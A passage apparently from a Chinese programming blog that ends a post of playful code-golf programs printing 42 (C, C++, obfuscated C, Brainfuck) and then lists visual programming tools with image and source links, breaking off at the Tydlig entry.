(42/42+42/ 42)));};}.setVisible(42*42*42!=42);}}
```

#### C/C++

```
#include
int main()
{
    printf("%d", fprintf( fopen("/dev/null","w"),
       "so-popularity-contest\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b") );
}
```

解释：\b是backspace，fprintf的返回值是写成功数据的长度。

```
#include<iostream>
using namespace std;
int main()
{
    cout<<(char)32<<(char)32<<(char)32;
    cout<<(char)66<<(char)73<<(char)82;
    cout<<(char)84<<(char)72<<(char)32;
    cout<<(char)32<<(char)32<<(char)32;
    cout<<(char)32<<(char)68<<(char)69;
    cout<<(char)65<<(char)84<<(char)72;
    cout<<(char)32<<(char)32<<'\n';
    cout<<(char)32<<(char)32<<(char)32;
    cout<<(char)32<<(char)32<<(char)95;
    cout<<(char)95<<(char)95<<(char)32;
    cout<<(char)32<<(char)32<<(char)32;
    cout<<(char)32<<(char)95<<(char)95;
    cout<<(char)95<<(char)95<<(char)95;
    cout<<(char)95<<(char)32<<'\n';
    cout<<(char)32<<(char)32<<(char)32;
    cout<<(char)32<<(char)47<<(char)32;
    cout<<(char)32<<(char)32<<(char)124;
    cout<<(char)32<<(char)32<<(char)32;
    cout<<(char)124<<(char)32<<(char)32;
    cout<<(char)95<<(char)95<<(char)32;
    cout<<(char)32<<(char)124<<'\n';
    cout<<(char)32<<(char)32<<(char)32;
    cout<<(char)47<<(char)32<<(char)47;
    cout<<(char)124<<(char)32<<(char)124;
    cout<<(char)32<<(char)32<<(char)32;
    cout<<(char)124<<(char)95<<(char)124;
    cout<<(char)32<<(char)32<<(char)124;
    cout<<(char)32<<(char)124<<'\n';
    cout<<(char)32<<(char)32<<(char)47;
    cout<<(char)32<<(char)47<<(char)32;
    cout<<(char)124<<(char)49<<(char)124;
    cout<<(char)32<<(char)32<<(char)32;
    cout<<(char)32<<(char)32<<(char)32;
    cout<<(char)32<<(char)32<<(char)47;
    cout<<(char)50<<(char)124<<'\n';
    cout<<(char)32<<(char)47<<(char)32;
    cout<<(char)47<<(char)32<<(char)32;
    cout<<(char)124<<(char)57<<(char)124;
    cout<<(char)32<<(char)32<<(char)32;
    cout<<(char)84<<(char)79<<(char)32;
    cout<<(char)32<<(char)47<<(char)48;
    cout<<(char)47<<(char)32<<'\n';
    cout<<(char)47<<(char)32<<(char)47;
    cout<<(char)95<<(char)95<<(char)95;
    cout<<(char)124<<(char)53<<(char)124;
    cout<<(char)95<<(char)95<<(char)32;
    cout<<(char)32<<(char)32<<(char)32;
    cout<<(char)47<<(char)48<<(char)47;
    cout<<(char)32<<(char)32<<'\n';
    cout<<(char)124<<(char)95<<(char)95;
    cout<<(char)95<<(char)95<<(char)95;
    cout<<(char)124<<(char)50<<(char)124;
    cout<<(char)95<<(char)95<<(char)124;
    cout<<(char)32<<(char)32<<(char)47;
    cout<<(char)49<<(char)47<<(char)32;
    cout<<(char)32<<(char)32<<'\n';
    cout<<(char)32<<(char)32<<(char)32;
    cout<<(char)32<<(char)32<<(char)32;
    cout<<(char)124<<(char)32<<(char)124;
    cout<<(char)32<<(char)32<<(char)32;
    cout<<(char)32<<(char)47<<(char)32;
    cout<<(char)47<<(char)32<<(char)32;
    cout<<(char)32<<(char)32<<'\n';
    cout<<(char)32<<(char)32<<(char)32;
    cout<<(char)32<<(char)32<<(char)32;
    cout<<(char)124<<(char)32<<(char)124;
    cout<<(char)32<<(char)32<<(char)32;
    cout<<(char)47<<(char)32<<(char)47;
    cout<<(char)95<<(char)95<<(char)95;
    cout<<(char)95<<(char)32<<'\n';
    cout<<(char)32<<(char)32<<(char)32;
    cout<<(char)32<<(char)32<<(char)32;
    cout<<(char)124<<(char)95<<(char)124;
    cout<<(char)32<<(char)32<<(char)124;
    cout<<(char)95<<(char)95<<(char)95;
    cout<<(char)95<<(char)95<<(char)95;
    cout<<(char)95<<(char)124<<'\n';
    return 0;
}  
```

输出：

![img](photo/42.png)

```
#include <stdio.h>

#define six  1+5
#define nine 8+1

int main()
{
    printf("what do you get when you multiply six by nine?\n");
    printf("%i x %i = %i\n", six, nine, six*nine);
}
```

解释：6 x 9 = 42 ???，如果你知道宏只是做简单的字符串替换的话，你就知道six*nine被替换成了1+5*8+1这个表达式了。呵呵。

```
        main(c     ,z,_){c==01?
       main(c+     1,0,c^c):c==2
      ?z=_["#"     "#$#%&#%#x'%%"
     "()&(%%x"             "$%$("
    "(&(""*%x"             "'%%("
   "(&(" "+%x"             "'#%("
  "(&("  "%#x"             ],z ?z
 =='x'?main(4,_     ,c*5):main(c
 +1,z,0),main(c    ,z,_+1):00:c
 ==3?(_+-2)==3?    main(_-1,_,
         32):(     main(
         c+1,c     ,((2+
         c)*(z     -35)+
         _)[""     "six"
         "*ni"     "ne= {   }   "
         "  ;"     "      _   ( "
         ") ["     " 3 ]do {;"]==
         32?32     :043),main(c,z
         ,_+1)     ):putchar(_);}
```

解释：参看[原文的这个答案](http://codegolf.stackexchange.com/questions/21835/most-creative-way-to-display-42/21950#21950)里的How-To一节。

#### Brainfuck

代码混乱自然少不了brainfuck语言：（更多的奇葩的编程语言请参考《[那些BT雷人的编程语言](https://coolshell.cn/articles/4458.html)》）

```
         +++++          +++[>+>++>
        +++>++        ++>+++++>+++++
       +>+++++       ++>+        ++++
      +++ >+++       ++++        ++>+
     +++  ++++                   ++>+
    +++   ++++                  +++>
   +++    ++++                 ++++
  +>+     ++++               ++++
 +++      +>++             ++++
++++++++>+++++++++       ++++
++>+++++++++++++++     +<<<
          <<<<        <<<<
          <<<<       <-]>
          >>>>       >>----.++++<<<<<
          <<>>       >>>>++.--<<<<<<.
```

不过，下面这个BrainFuck更无聊，所以顶在了最佳答案上：

```
           +++++[>++[>+>+        ++>++++>++++>++++>++++++
          >++++++>+++++++        ++>+++++++++<<<<<<<<<-]>>
         >+>+>+> >>>+[<]<        -]>>       >++>-->>+>>++>+
        >--<<<<  <<<.....         .>            ....<......
       ...>...   <<.>....                       >.>>>>>.<.
       <<<<..     ..<....                      >..>>>>>.<
      .<<<<.      >>>.<<.                     >>>>>.<.<
      <<<<<       <.>...>                    >>>.>>>.
     <<<.<        <<<..>>                  .>>>>>.<
    <.<<<         <<...>>                 >>>.<<<
   <..<.          ...>...               <<.>..>.
   >>.<.<<...>>...<<...>>...<         <....>>..
  .<<<.>.>>..>.<<.......<....        .....>...
                 <<.>...            .....>...
                 <......           .>>>.<<..
                 <<.>...          .....>...<......>.>>.<.<<<
                 .>......        ..>>...<<....>>.....>.<..>.
```

执行上面的代码，你会得到下面的输出：

```
      ++++         +++
    +[>++++    ++[>+<-][
   <]<  -]>   >++    +++
  +.-   ---   ---    ---
 --.+++++++         +++
        +++       .++
        +++      +.-
        ---    -----.--.
```

再执行上面的代码，会输出：

```
6*7=42
```

如果6*9=42就完美了，就差一步啊……

(全文完)

# 可视化编程

#####  [2014年02月22日 ](https://coolshell.cn/articles/11094.html) [陈皓](https://coolshell.cn/articles/author/haoel) 评论 [48 条评论](https://coolshell.cn/articles/11094.html#comments) 51,775 人阅读

本文来自《[Visual Programming Languages – Snapshots](http://blog.interfacevision.com/design/design-visual-progarmming-languages-snapshots/)》，作者[Eric Hosick](https://twitter.com/erichosick)收集了一堆关于可视化编程的工具，好多我都听都没听说过，我一股脑的全转过来，给大家看看，算是开开眼界了。本文也是参考了Wikipedia的 [Visual Programming Language](https://en.wikipedia.org/wiki/Visual_programming_language) 词条。

另外，在原文有很多评论，其中也有很多正文没有提到的，你可以前去围观一下。

目录



[SketchPad](https://coolshell.cn/articles/11094.html#SketchPad)[Alice](https://coolshell.cn/articles/11094.html#Alice)[App Inventor For Android](https://coolshell.cn/articles/11094.html#App_Inventor_For_Android)[ArcGIS Model Builder](https://coolshell.cn/articles/11094.html#ArcGIS_Model_Builder)[Automator](https://coolshell.cn/articles/11094.html#Automator)[Blockly](https://coolshell.cn/articles/11094.html#Blockly)[Bounce](https://coolshell.cn/articles/11094.html#Bounce)[Copper Thoughts](https://coolshell.cn/articles/11094.html#Copper_Thoughts)[DRAKON](https://coolshell.cn/articles/11094.html#DRAKON)[Etoys / Squeak](https://coolshell.cn/articles/11094.html#Etoys_Squeak)[Field](https://coolshell.cn/articles/11094.html#Field)[FL Studio](https://coolshell.cn/articles/11094.html#FL_Studio)[Flow Hub and NoFlo](https://coolshell.cn/articles/11094.html#Flow_Hub_and_NoFlo)[FlowStone](https://coolshell.cn/articles/11094.html#FlowStone)[GoDot Engine](https://coolshell.cn/articles/11094.html#GoDot_Engine)[Google Web Designer](https://coolshell.cn/articles/11094.html#Google_Web_Designer)[Hopscotch](https://coolshell.cn/articles/11094.html#Hopscotch)[HyperCard](https://coolshell.cn/articles/11094.html#HyperCard)[IFTTT](https://coolshell.cn/articles/11094.html#IFTTT)[Illumination Software Creator](https://coolshell.cn/articles/11094.html#Illumination_Software_Creator)[Intentional Technology](https://coolshell.cn/articles/11094.html#Intentional_Technology)[Jeskola Buzz](https://coolshell.cn/articles/11094.html#Jeskola_Buzz)[Kimono](https://coolshell.cn/articles/11094.html#Kimono)[Kodu (Boku)](https://coolshell.cn/articles/11094.html#Kodu_Boku)[LabView](https://coolshell.cn/articles/11094.html#LabView)[Ladder Logic](https://coolshell.cn/articles/11094.html#Ladder_Logic)[Lamdu](https://coolshell.cn/articles/11094.html#Lamdu)[Lava](https://coolshell.cn/articles/11094.html#Lava)[Learnable Programming](https://coolshell.cn/articles/11094.html#Learnable_Programming)[Light Table](https://coolshell.cn/articles/11094.html#Light_Table)[Lily](https://coolshell.cn/articles/11094.html#Lily)[Limnor Studio](https://coolshell.cn/articles/11094.html#Limnor_Studio)[Little Big Planet](https://coolshell.cn/articles/11094.html#Little_Big_Planet)[Minecraft](https://coolshell.cn/articles/11094.html#Minecraft)[Minibloq](https://coolshell.cn/articles/11094.html#Minibloq)[Morphic](https://coolshell.cn/articles/11094.html#Morphic)[Mozilla Appmaker](https://coolshell.cn/articles/11094.html#Mozilla_Appmaker)[MST Workshop](https://coolshell.cn/articles/11094.html#MST_Workshop)[NeatTools Visual Programming Environment](https://coolshell.cn/articles/11094.html#NeatTools_Visual_Programming_Environment)[NodeBox](https://coolshell.cn/articles/11094.html#NodeBox)[Nuke](https://coolshell.cn/articles/11094.html#Nuke)[NXT-G](https://coolshell.cn/articles/11094.html#NXT-G)[Open Modelica](https://coolshell.cn/articles/11094.html#Open_Modelica)[Open Music](https://coolshell.cn/articles/11094.html#Open_Music)[OpenWire](https://coolshell.cn/articles/11094.html#OpenWire)[Origami](https://coolshell.cn/articles/11094.html#Origami)[Piet](https://coolshell.cn/articles/11094.html#Piet)[Programming Without Coding Technology](https://coolshell.cn/articles/11094.html#Programming_Without_Coding_Technology)[Prograph](https://coolshell.cn/articles/11094.html#Prograph)[Pure Data](https://coolshell.cn/articles/11094.html#Pure_Data)[Quartz Composer](https://coolshell.cn/articles/11094.html#Quartz_Composer)[Reaktor](https://coolshell.cn/articles/11094.html#Reaktor)[Scheme Bricks](https://coolshell.cn/articles/11094.html#Scheme_Bricks)[Scratch](https://coolshell.cn/articles/11094.html#Scratch)[Self](https://coolshell.cn/articles/11094.html#Self)[Sextante](https://coolshell.cn/articles/11094.html#Sextante)[Simulink](https://coolshell.cn/articles/11094.html#Simulink)[Sikuli](https://coolshell.cn/articles/11094.html#Sikuli)[SQL Server Integration Services](https://coolshell.cn/articles/11094.html#SQL_Server_Integration_Services)[Story Code](https://coolshell.cn/articles/11094.html#Story_Code)[TextIt](https://coolshell.cn/articles/11094.html#TextIt)[Touch Develop](https://coolshell.cn/articles/11094.html#Touch_Develop)[Tydlig](https://coolshell.cn/articles/11094.html#Tydlig)[UDK](https://coolshell.cn/articles/11094.html#UDK)[Visual JForex](https://coolshell.cn/articles/11094.html#Visual_JForex)[VUO](https://coolshell.cn/articles/11094.html#VUO)[VVVV](https://coolshell.cn/articles/11094.html#VVVV)[Windows Workflow Foundation](https://coolshell.cn/articles/11094.html#Windows_Workflow_Foundation)

#### SketchPad

Maybe the first. 1963.

[图片来源](https://mydiesel22.blogspot.com/2011/05/vector-and-digital-graphics.html), [Wikipedia](https://en.wikipedia.org/wiki/Sketchpad) 和 [官方网站](https://www.youtube.com/watch?v=495nCzxM9PI&feature=player_embedded)

![img](http://blog.interfacevision.com/assets/img/posts/example_visual_language_sketchpad_01.jpg)![img]()



#### Alice

[图片来源](http://www.alice.org/index.php), [Wikipedia](https://en.wikipedia.org/wiki/Alice_(software)) 和 [官方网站](https://en.wikipedia.org/wiki/File:Alice-2-screenshot.jpg)

![img](http://blog.interfacevision.com/assets/img/posts/example_visual_language_alice_01.jpg)![img]()

#### App Inventor For Android

[图片来源](http://beta.appinventor.mit.edu/learn/tutorials/whereismycar/whereismycar.html), [Wikipedia](https://en.wikipedia.org/wiki/App_Inventor_for_Android) 和 [官方网站](http://appinventor.mit.edu/explore/)

![img](http://blog.interfacevision.com/assets/img/posts/example_visual_language_app_inventor_01.png)![img]()

#### ArcGIS Model Builder

[图片来源](http://www.rockware.com/product/featuresLobby.php?id=193&category=615) 和 [官方网站](http://resources.arcgis.com/en/help/main/10.1/index.html#//002w00000001000000)

![img](http://blog.interfacevision.com/assets/img/posts/example_visual_language_app_arcgis_01.gif)![img]()

#### Automator

[图片来源](http://www.apple.com/remotedesktop/automation.html), [Wikipedia](https://en.wikipedia.org/wiki/Automator_(software)) 和 [官方网站](http://www.apple.com/osx/apps/#automator)

![img](http://blog.interfacevision.com/assets/img/posts/example_visual_language_automator_01.jpg)![img]()

#### Blockly

[图片来源](http://i.imgur.com/PfJO2.png) 和 [官方网站](https://code.google.com/p/blockly/)

![img](http://blog.interfacevision.com/assets/img/posts/example_visual_language_blockly_01.png)![img]()

#### Bounce

[图片来源](http://www.art.net/~hopkins/Don/lang/bounce/SpaceSeedCircuits.gif) 和 [官方网站](http://www.art.net/~hopkins/Don/lang/bounce/bounce.html)

![img](http://blog.interfacevision.com/assets/img/posts/example_visual_language_bounce_01.gif)![img]()

#### Copper Thoughts

[图片来源](http://www.copperthoughts.com/assets/request-fsm-instance.png) 和 [官方网站](http://www.copperthoughts.com/)

![img](http://blog.interfacevision.com/assets/img/posts/example_visual_language_copper_01.png)![img]()

#### DRAKON

[图片来源](https://en.wikipedia.org/wiki/DRAKON), [Wikipedia](https://en.wikipedia.org/wiki/DRAKON) 和 [官方网站](http://drakon-editor.sourceforge.net/)

![img](http://blog.interfacevision.com/assets/img/posts/example_visual_language_drakon_01.png)![img]()

#### Etoys / Squeak

[图片来源](https://en.wikipedia.org/wiki/File:Squeak-screenshot.png), [Wikipedia](https://en.wikipedia.org/wiki/Etoys_(programming_language)) 和 [官方网站](http://www.squeakland.org/)

![img](http://blog.interfacevision.com/assets/img/posts/example_visual_language_etoysqueak_01.png)![img]()

#### Field

[图片来源](http://openendedgroup.com/field/OverviewBanners2.html) 和 [官方网站](http://openendedgroup.com/field/)

![img](http://blog.interfacevision.com/assets/img/posts/example_visual_language_field_01.png)![img]()

#### FL Studio

[图片来源](http://freaksolid.wordpress.com/2013/05/20/fl-studio-11-patcher-dj-performance-presets/), [Wikipedia](https://en.wikipedia.org/wiki/Fl_studio) 和 [官方网站](http://www.image-line.com/flstudio/)

![img](http://blog.interfacevision.com/assets/img/posts/example_visual_language_flstudiopatcher_01.jpg)![img]()

#### Flow Hub and NoFlo

Flow-Based Programming.

[图片来源 1](http://flowhub.io/), [图片来源 2](http://cdn.thegrid.io.s3.amazonaws.com/noflo/kickstarter/images/UI-03.jpg) [官方网站 1](http://noflojs.org/) 和 [官方网站 2](http://flowhub.io/)

![img](http://blog.interfacevision.com/assets/img/posts/example_visual_language_flohub_01.png)![img]()

![img](http://blog.interfacevision.com/assets/img/posts/example_visual_language_noflo_01.jpg)![img]()

#### FlowStone

[图片来源](https://en.wikipedia.org/wiki/File:FlowStone_Large_Screenshot.png) 和 [官方网站](http://www.dsprobotics.com/flowstone.html)

![img](http://blog.interfacevision.com/assets/img/posts/example_visual_language_flowstone_01.png)![img]()

#### GoDot Engine

[图片来源](http://www.godotengine.org/wp/wp-content/uploads/2014/01/editor2.jpg) 和 [官方网站](http://www.godotengine.org/wp/)

![img](http://blog.interfacevision.com/assets/img/posts/example_visual_language_godot_01.jpg)![img]()

#### Google Web Designer

图片来源, [Wikipedia](https://en.wikipedia.org/wiki/Google_Web_Designer) 和 [官方网站](https://www.google.com/webdesigner/)

![img](http://blog.interfacevision.com/assets/img/posts/example_visual_language_webdesigner_01.png)![img]()

#### Hopscotch

[图片来源](https://www.gethopscotch.com/), [Wikipedia](https://en.wikipedia.org/wiki/Hopscotch_(programming_language)) 和 [官方网站](https://www.gethopscotch.com/)

![img](http://blog.interfacevision.com/assets/img/posts/example_visual_language_hopscotch_01.png)![img]()

#### HyperCard

[图片来源](http://www.smackerel.net/black_white_02.html), [Wikipedia](https://en.wikipedia.org/wiki/HyperCard) 和 [官方网站???](http://hypercard.org/)

![img](http://blog.interfacevision.com/assets/img/posts/example_visual_language_hypercard_01.gif)![img]()

#### IFTTT

[图片来源](https://ifttt.com/recipes), [Wikipedia](https://en.wikipedia.org/wiki/Ifttt) 和 [官方网站](https://ifttt.com/wtf)

![img](http://blog.interfacevision.com/assets/img/posts/example_visual_language_ifttt_01.png)![img]()

#### Illumination Software Creator

[图片来源](http://lunduke.com/2010/06/16/illumination-software-creator-20-beta-2/), [Wikipedia](https://en.wikipedia.org/wiki/Illumination_Software_Creator) 和 [官方网站](http://lunduke.com/2010/06/16/illumination-software-creator-20-beta-2/)

![img](http://blog.interfacevision.com/assets/img/posts/example_visual_language_illumination_01.png)![img]()

#### Intentional Technology

[图片来源](http://www.intentsoft.com/intentional-technology/) 和 [官方网站](http://www.intentsoft.com/intentional-technology/)

![img](http://blog.interfacevision.com/assets/img/posts/example_visual_language_IntentionalTech_01.png)![img]()

#### Jeskola Buzz

[图片来源](http://blog.livedoor.jp/acid808/archives/cat_693944.html), [Wikipedia](https://en.wikipedia.org/wiki/Jeskola_Buzz) 和 [官方网站](http://www.jeskola.net/buzz/)

![img](http://blog.interfacevision.com/assets/img/posts/example_visual_language_jeskolabuzz_01.jpg)![img]()

#### Kimono

[官方网站](http://www.kimonolabs.com/)

![img](http://blog.interfacevision.com/assets/img/posts/example_visual_language_kimono_01.png)![img]()

#### Kodu (Boku)

[图片来源](http://www.interactiveclassroom.net/?p=508), [Wikipedia](https://en.wikipedia.org/wiki/Kodu) 和 [官方网站](http://research.microsoft.com/en-us/projects/kodu/)

![img](http://blog.interfacevision.com/assets/img/posts/example_visual_language_kodu_01.png)![img]()

#### LabView

[图片来源](http://www.ni.com/newsletter/51735/en/), [Wikipedia](https://en.wikipedia.org/wiki/LabVIEW) 和 [官方网站](http://www.ni.com/)

![img](http://blog.interfacevision.com/assets/img/posts/example_visual_language_labview_02.png)![img]()

#### Ladder Logic

[图片来源](https://en.wikipedia.org/wiki/Ladder_logic), [Wikipedia](https://en.wikipedia.org/wiki/Ladder_logic) 和 官方网站

![img](http://blog.interfacevision.com/assets/img/posts/example_visual_language_ladderlogic_01.png)![img]()

#### Lamdu

[图片来源](http://peaker.github.io/lamdu/) 和 [官方网站](http://peaker.github.io/lamdu/)

![img](http://blog.interfacevision.com/assets/img/posts/example_visual_language_lamdu_01.png)![img]()

#### Lava

[图片来源](http://lavape.sourceforge.net/Derivation.htm), [Wikipedia](https://en.wikipedia.org/wiki/Lava_(programming_language)) 和 [官方网站](http://lavape.sourceforge.net/)

![img](http://blog.interfacevision.com/assets/img/posts/example_visual_language_lava_01.png)![img]()

#### Learnable Programming

More of a post on different ways to learn programming.

[图片来源](http://worrydream.com/#!/LearnableProgramming) 和 [官方网站](http://worrydream.com/#!/LearnableProgramming)

![img](http://blog.interfacevision.com/assets/img/posts/example_visual_language_learnable_01.png)![img]()

#### Light Table

Chris Granger’s development environment. [图片来源](https://plus.google.com/+JJoeDouglas/posts), [Wikipedia](https://en.wikipedia.org/wiki/Light_table_(software)) 和 [官方网站](http://www.lighttable.com/)

![img](http://blog.interfacevision.com/assets/img/posts/example_visual_language_lighttable_01.jpg)![img]()

#### Lily

Really cool and hard to describe. You need to visit their demo web page and watch their videos. [图片来源](http://blog.lilyapp.org/lily/demo/), [Wikipedia](https://en.wikipedia.org/wiki/Lily_(software)) 和 [官方网站](http://blog.lilyapp.org/lily/demo/)

![img](http://blog.interfacevision.com/assets/img/posts/example_visual_language_lily_01.png)![img]()

#### Limnor Studio

[图片来源](http://www.limnor.com/studio_whatIsIt.html), [Wikipedia](https://en.wikipedia.org/wiki/Limnor) 和 [官方网站](http://www.limnor.com/studio_whatIsIt.html)

![img](http://blog.interfacevision.com/assets/img/posts/example_visual_language_limnorstudio_01.png)![img]()

#### Little Big Planet

Someone built an An [8-bit Mechanical Adder in LittleBigPlanet](https://www.youtube.com/watch?v=jWanvKdurU0)

[图片来源](https://www.youtube.com/watch?v=jWanvKdurU0), [Wikipedia](https://en.wikipedia.org/wiki/LittleBigPlanet) 和 [官方网站](https://littlebigplanet.playstation.com/)

![img](http://blog.interfacevision.com/assets/img/posts/example_visual_language_littlebig_01.png)![img]()

#### Minecraft

Considering someone has created a [fully programmable computer](https://www.youtube.com/watch?v=frcr9XYeTW4) using Minecraft.

[图片来源](https://www.youtube.com/watch?v=frcr9XYeTW4), [Wikipedia](https://en.wikipedia.org/wiki/Minecraft) 和 [官方网站](https://minecraft.net/)

![img](http://blog.interfacevision.com/assets/img/posts/example_visual_language_minecraft_01.png)![img]()

#### Minibloq

This has a really cool looking interface. [图片来源](https://en.wikipedia.org/wiki/File:ToneWithVariables.png), [Wikipedia](https://en.wikipedia.org/wiki/Minibloq) 和 [官方网站](http://blog.minibloq.org/)

![img](http://blog.interfacevision.com/assets/img/posts/example_visual_language_minibloq_01.png)![img]()

#### Morphic

[图片来源](http://www.cc.gatech.edu/fac/mark.guzdial/squeak/startingmorphic.html), [Wikipedia](https://en.wikipedia.org/wiki/Morphic_(software)) 和 [官方网站](http://www.dmoz.org/Computers/Software/Operating_Systems/Graphic_Subsystems/Morphic)

![img](http://blog.interfacevision.com/assets/img/posts/example_visual_language_morphic_01.gif)![img]()

#### Mozilla Appmaker

This was discussed quite a bit on [Ycombinator](https://news.ycombinator.com/item?id=6501731). [图片来源](https://2.bp.blogspot.com/-1xD81b5fPso/Uly-amqf9vI/AAAAAAAAC8I/n7ehLipb1CE/s1600/appmaker.png) 和 [官方网站](https://appmaker.mozillalabs.com/)

![img](http://blog.interfacevision.com/assets/img/posts/example_visual_language_appmaker_01.png)![img]()

#### MST Workshop

[图片来源](http://home.comcast.net/~tpandolfi/site/?/photos/&PHPSESSID=63621f2035fe55537d794ab0ac795934), [Wikipedia](https://en.wikipedia.org/wiki/MST_Workshop) 和 [官方网站](http://home.comcast.net/~tpandolfi/site/?/home/)

![img](http://blog.interfacevision.com/assets/img/posts/example_visual_language_mst_01.jpg)![img]()

#### NeatTools Visual Programming Environment

[图片来源](http://www.sensyr.com/NeatTools.html) 和 [官方网站](http://www.neattools.org/)

![img](http://blog.interfacevision.com/assets/img/posts/example_visual_language_NeatTools_01.png)![img]()

#### NodeBox

[图片来源](http://nodebox.net/node/) 和 [官方网站](http://nodebox.net/)

![img](http://blog.interfacevision.com/assets/img/posts/example_visual_language_nodebox_01.png)![img]()

#### Nuke

[图片来源](http://www.thefoundry.co.uk/products/nuke-product-family/nuke/), [Wikipedia](https://en.wikipedia.org/wiki/Nuke_(software)) 和 [官方网站](http://www.thefoundry.co.uk/products/nuke-product-family/nuke/)

![img](http://blog.interfacevision.com/assets/img/posts/example_visual_language_nuke_01.png)![img]()

#### NXT-G

Legos!!! [图片来源](http://www.brickshelf.com/cgi-bin/gallery.cgi?i=2051945), [Wikipedia](https://en.wikipedia.org/wiki/Lego_Mindstorms_NXT#NXT-G) 和 [官方网站](http://www.legoengineering.com/program/nxt-g/)

![img](http://blog.interfacevision.com/assets/img/posts/example_visual_language_nxt-g_01.png)![img]()

#### Open Modelica

[图片来源](http://www.marekgayer.com/en/projects/incfd/) 和 [官方网站](https://www.openmodelica.org/)

![img](http://blog.interfacevision.com/assets/img/posts/example_visual_language_openmodelica_01.jpg)![img]()

#### Open Music

[图片来源](https://en.wikipedia.org/wiki/File:Om_patch.gif), [Wikipedia](https://en.wikipedia.org/wiki/OpenMusic) 和 [官方网站](http://repmus.ircam.fr/openmusic/home)

![img](http://blog.interfacevision.com/assets/img/posts/example_visual_language_openmusic_01.gif)![img]()

#### OpenWire

[图片来源](http://www.mitov.com/products/openwire#screenshots), [Wikipedia](https://en.wikipedia.org/wiki/OpenWire_(library)) 和 [官方网站](http://www.mitov.com/products/openwire#overview)

![img](http://blog.interfacevision.com/assets/img/posts/example_visual_language_openwire_01.png)![img]()

#### Origami

[图片来源](http://a.36krcnd.com/photo/2014/d2878df00bea4bfb782037f1683423e3.jpg) 和 [官方网站](http://facebook.github.io/origami/)

![img](http://blog.interfacevision.com/assets/img/posts/example_visual_language_origami_01.jpg)![img]()

#### Piet

[图片来源](https://en.wikipedia.org/wiki/Piet_(programming_language)#Piet), [Wikipedia](https://en.wikipedia.org/wiki/Piet_(programming_language)#Piet) 和 [官方网站](http://www.retas.de/thomas/computer/programs/useless/piet/Piet/index.html)

![img](http://blog.interfacevision.com/assets/img/posts/example_visual_language_piet_01.gif)![img]()

#### Programming Without Coding Technology

[图片来源](http://sourceforge.net/projects/doublesvsoop/?source=recommended) 和 [官方网站](http://doublesvsoop.sourceforge.net/)

![img](http://blog.interfacevision.com/assets/img/posts/example_visual_language_pwct_01.png)![img]()

#### Prograph

[图片来源](https://en.wikipedia.org/wiki/File:Prograph_database_operation.PNG), [Wikipedia](https://en.wikipedia.org/wiki/Prograph) 和 [官方网站??](http://c2.com/cgi/wiki?PrographLanguage)

![img](http://blog.interfacevision.com/assets/img/posts/example_visual_language_prograph_01.png)![img]()

#### Pure Data

[图片来源](https://en.wikipedia.org/wiki/File:Pd_example_3.svg), [Wikipedia](https://en.wikipedia.org/wiki/Pure_Data) 和 [官方网站](http://puredata.info/)

![img](http://blog.interfacevision.com/assets/img/posts/example_visual_language_puredata_01.png)![img]()

#### Quartz Composer

[图片来源](http://mastersofmedia.hum.uva.nl/2011/10/24/finally-it-comes-together/), [Wikipedia](https://en.wikipedia.org/wiki/Quartz_Composer) 和 [官方网站](https://developer.apple.com/technologies/mac/graphics-and-animation.html)

![img](http://blog.interfacevision.com/assets/img/posts/example_visual_language_quartz_01.jpg)![img]()

#### Reaktor

[图片来源](https://media.soundonsound.com/sos/oct99/images/reaktor5.gif), [Wikipedia](https://en.wikipedia.org/wiki/Reaktor) 和 [官方网站](http://www.native-instruments.com/en/products/komplete/synths-samplers/reaktor-5/)

![img](http://blog.interfacevision.com/assets/img/posts/example_visual_language_reaktor_01.gif)![img]()

#### Scheme Bricks

[图片来源](http://www.pawfal.org/dave/blog/2010/05/scheme-bricks-for-graphics/) 和 [官方网站](http://www.pawfal.org/dave/index.cgi?Projects/Scheme Bricks)

![img](http://blog.interfacevision.com/assets/img/posts/example_visual_language_schemebricks_01.png)![img]()

#### Scratch

[图片来源 1](http://scratch.mit.edu/projects/11126006/#editor), [图片来源 2](http://scratch.mit.edu/projects/11126006/#editor), [Wikipedia](https://en.wikipedia.org/wiki/Scratch_(programming_language)) 和 [官方网站](http://scratch.mit.edu/)

![img](http://blog.interfacevision.com/assets/img/posts/example_visual_language_scratch_01.png)![img]()

![img](http://blog.interfacevision.com/assets/img/posts/example_visual_language_scratch_02.png)![img]()

#### Self

[图片来源](http://handbook.selflanguage.org/current/langref.html#objects), [Wikipedia](https://en.wikipedia.org/wiki/Self_(programming_language)) 和 [官方网站](http://selflanguage.org/)

![img](http://blog.interfacevision.com/assets/img/posts/example_visual_language_self_01.png)![img]()

#### Sextante

[图片来源](http://www.gvsig.com/files/images/screenshots/gvSIG_Sextante_02.png) 和 [官方网站](http://sextantegis.com/)

![img](http://blog.interfacevision.com/assets/img/posts/example_visual_language_sextante_01.png)![img]()

#### Simulink

[图片来源](http://www.mathworks.com/products/simulink/?s_cid=wiki_simulink_8), [Wikipedia](https://en.wikipedia.org/wiki/Simulink) 和 [官方网站](http://www.mathworks.com/products/simulink/?s_cid=wiki_simulink_8)

![img](http://blog.interfacevision.com/assets/img/posts/example_visual_language_simlink_01.png)![img]()

#### Sikuli

[图片来源](http://hellotestworld.com/2012/04/27/sikuli-for-all-those-hard-to-reach-places/), [Wikipedia](https://en.wikipedia.org/wiki/Sikuli) 和 [官方网站](http://www.sikuli.org/)

![img](http://blog.interfacevision.com/assets/img/posts/example_visual_language_sikuli_01.png)![img]()

#### SQL Server Integration Services

[图片来源](http://technet.microsoft.com/en-us/library/cc917721.aspx), [Wikipedia](https://en.wikipedia.org/wiki/SQL_Server_Integration_Services) 和 [官方网站](http://www.microsoft.com/en-us/sqlserver/solutions-technologies/enterprise-information-management/integration-services.aspx)

![img](http://blog.interfacevision.com/assets/img/posts/example_visual_language_sqlintegration_01.png)![img]()

#### Story Code

[图片来源](http://softconstructors.com/en/applications/stroycode/screenshots.html) 和 [官方网站](http://softconstructors.com/en/applications/stroycode/)

![img](http://blog.interfacevision.com/assets/img/posts/example_visual_language_stroycode_01.png)![img]()

#### TextIt

[图片来源](https://textit.in/) 和 [官方网站](https://textit.in/)

![img](http://blog.interfacevision.com/assets/img/posts/example_visual_language_textit_01.png)![img]()

#### Touch Develop

From Microsoft research.

[图片来源](http://handheld.softpedia.com/progScreenshots/TouchDevelop-Screenshot-125731.html) 和 [官方网站](https://www.touchdevelop.com/)

![img](http://blog.interfacevision.com/assets/img/posts/example_visual_language_touchdevelop_01.jpg)![img]()

#### Tydlig

